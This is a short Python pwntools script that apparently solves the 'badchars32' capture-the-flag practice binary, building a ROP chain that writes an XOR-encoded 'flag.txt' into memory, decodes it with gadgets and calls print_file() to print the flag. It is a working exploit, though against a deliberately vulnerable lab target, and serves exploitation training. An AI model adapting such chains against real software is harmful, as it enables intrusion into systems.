#/usr/bin/python3
from pwn import process, p32, xor, log

shell = process("./badchars32")

offset = 44
junk = b"A" * offset

string = xor(b"flag.txt", 0x2)

payload  = b""
payload += junk

for i in range(0, len(string), 4):
    payload += p32(0x80485b9)     # pop esi; pop edi; pop ebp; ret;
    payload += string[i:i+4]      # string
    payload += p32(0x804a018 + i) # .data
    payload += p32(0x0)           # padding for pop
    payload += p32(0x0804854f)    # mov dword ptr [edi], esi; ret;

for i in range(8):
    payload += p32(0x80485bb)     # pop ebp; ret;
    payload += p32(0x804a018 + i) # .data
    payload += p32(0x804839d)     # pop ebx; ret;
    payload += p32(0x2)           # xor key
    payload += p32(0x8048547)     # xor byte ptr [ebp], bl; ret;

payload += p32(0x80483d0) # print_file()
payload += b"B" * 4       # return addr
payload += p32(0x804a018) # "flag.txt"

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
